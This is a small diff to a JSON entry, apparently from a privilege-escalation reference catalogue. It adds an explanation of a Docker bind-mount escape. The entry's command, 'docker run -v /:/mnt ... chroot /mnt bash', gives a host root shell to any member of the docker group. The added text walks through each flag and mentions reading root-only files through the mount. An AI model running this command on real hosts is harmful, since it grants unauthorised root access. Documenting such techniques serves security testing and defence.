@@ -120,5 +120,6 @@
       "label": "Escape to root via a bind-mount",
       "command": "docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash"
     }
-  ]
+  ],
+  "explain": "Escapes to host root via docker-group membership (root-equivalent):\n  docker run -v /:/mnt     mount the host root filesystem into a container\n  --rm -it ubuntu          throwaway interactive Ubuntu container\n  chroot /mnt bash         chroot into the host filesystem and get a shell as its root\nOne command to a host root shell; you can also just cat a root-only file via the mount. id | grep docker confirms membership."
 }
